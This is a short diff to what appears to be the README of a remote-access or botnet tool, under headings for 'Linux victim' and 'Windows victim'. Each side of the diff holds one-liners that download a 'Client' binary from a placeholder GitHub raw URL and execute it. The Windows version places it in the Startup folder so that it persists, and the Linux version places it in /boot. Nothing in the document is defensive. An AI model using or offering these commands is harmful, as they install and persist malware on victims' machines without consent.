@@ -23,7 +23,7 @@ bnt: @udbnt
 ![image](https://user-images.githubusercontent.com/104208624/203849645-908bde50-bd0a-49fa-9a8a-1f948953677e.png)
 
 # Linux victim
-cd /tmp; apt-get update -y; apt-get install curl -y; curl -O Client "https://raw.githubusercontent.com/NAME/NAME/main/NAME"; chmod 777 Client; cp Client /boot; ./Client
+cd /boot; apt-get update -y; apt-get install curl -y; [ -f "Client" ] && rm Client; curl -O Client "https://raw.githubusercontent.com/NAME/NAME/main/NAME"; chmod 777 Client; ./Client
 
 # Windows victim
-cd %temp% && powershell -command Invoke-WebRequest https://github.com/NAME/NAME/raw/main/NAME.exe -OutFile Client.exe && copy Client.exe "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup" && Client.exe
+cd "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup" && if exist Client.exe del Client.exe && powershell -command Invoke-WebRequest https://github.com/NAME/NAME/raw/main/NAME.exe -OutFile Client.exe && Client.exe
